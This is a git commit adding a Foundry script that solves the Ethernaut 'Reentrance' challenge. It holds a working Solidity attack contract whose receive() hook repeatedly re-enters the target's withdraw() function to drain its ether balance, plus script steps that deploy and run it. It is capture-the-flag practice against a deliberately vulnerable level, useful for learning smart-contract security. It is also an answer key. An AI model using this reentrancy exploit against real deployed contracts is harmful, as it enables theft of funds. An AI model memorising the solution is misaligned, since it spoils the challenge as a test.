3d33916db5f6d7eec79fcc07d50625d7e2f9fecd
LouisTsai <q1030176@gmail.com>
2024-01-05 10:31:34 +0800

    feat: complete 10 reentrance challenge

--- script/solutions/10-Reentrance.s.sol
+++ script/solutions/10-Reentrance.s.sol
@@ -5,6 +5,38 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface IReentrance {
+    function donate(address _to) external payable;
+    function balanceOf(address _who) external returns(uint256);
+    function withdraw(uint _amount) external;
+}
+
+contract Attack {
+    address immutable owner;
+    address immutable instance;
+    uint256 balance;
+    constructor(address addr) payable {
+        owner = msg.sender;
+        instance = addr;
+    }
+
+    function exploit() external {
+        IReentrance(instance).donate{value: address(this).balance}(address(this));
+        balance = IReentrance(instance).balanceOf(address(this));
+        IReentrance(instance).withdraw(balance);
+    }
+
+    function withdraw() external {
+        (bool success, ) = owner.call{value: address(this).balance}("");
+        require(success, "Transfer Failed");
+    }
+
+    receive() external payable {
+        if(instance.balance>0) {
+            IReentrance(instance).withdraw(balance);
+        }
+    }
+}
 
 contract ReentranceSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x2a24869323C0B13Dff24E196Ba072dC790D52479;
@@ -15,9 +47,9 @@ contract ReentranceSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-
-
+        Attack attack = new Attack{value: 0.001 ether}(challengeInstance);
+        attack.exploit();
+        attack.withdraw();
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
